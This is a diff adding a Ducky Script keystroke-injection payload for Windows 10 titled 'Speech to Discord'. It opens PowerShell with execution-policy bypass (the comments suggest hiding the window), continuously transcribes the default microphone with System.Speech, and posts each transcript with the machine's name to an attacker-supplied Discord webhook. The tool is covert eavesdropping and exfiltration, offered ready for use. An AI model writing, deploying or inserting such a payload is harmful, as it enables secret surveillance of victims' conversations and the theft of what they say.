@@ -1,0 +1,21 @@
+REM Title: Speech to Discord
+REM Author: @beigeworm | https://github.com/beigeworm
+REM Description: Write a transcript of audio from the mic and send to discord.
+REM Target: Windows 10
+
+REM SETUP
+REM replace YOUR_WEBHOOK_HERE (below) with your discord webhook.
+
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+GUI r
+DELAY 750
+
+REM open powershell (add "-W Hidden" to hide the window).
+STRING powershell -NoP -NonI -Exec Bypass
+ENTER
+DELAY 5000
+
+STRING Add-Type -AssemblyName System.Speech;$speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine;$grammar = New-Object System.Speech.Recognition.DictationGrammar;$speech.LoadGrammar($grammar);$speech.SetInputToDefaultAudioDevice();while($true){$result = $speech.Recognize();if ($result) {$results = $result.Text;Write-Output $results;$dc = 'WEBHOOK_HERE';$Body = @{'username' = $env:COMPUTERNAME ; 'content' = $results};irm -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)}};exit
+ENTER
